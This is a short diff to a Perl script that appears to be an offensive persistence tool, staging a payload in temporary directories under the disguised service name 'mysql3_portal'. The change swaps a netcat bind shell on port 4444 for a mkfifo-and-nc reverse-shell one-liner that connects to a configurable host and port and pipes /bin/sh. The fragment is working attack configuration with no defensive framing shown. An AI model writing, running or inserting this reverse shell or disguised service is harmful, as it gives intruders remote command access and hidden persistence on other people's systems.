@@ -21,7 +21,9 @@ system and as a user.
 =cut
 
 my @cp_dirs = qw(/var/tmp /tmp /dev/shm);
-my $executable_args = '-lvnp 4444 -e /bin/bash';
+my $ip = '0.0.0.0';
+my $port = '10000';
+my $executable_args = "-c 'mkfifo /tmp/f; nc $ip $port < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f'";
 my $service_name = 'mysql3_portal';
 
 if (@ARGV < 1) {
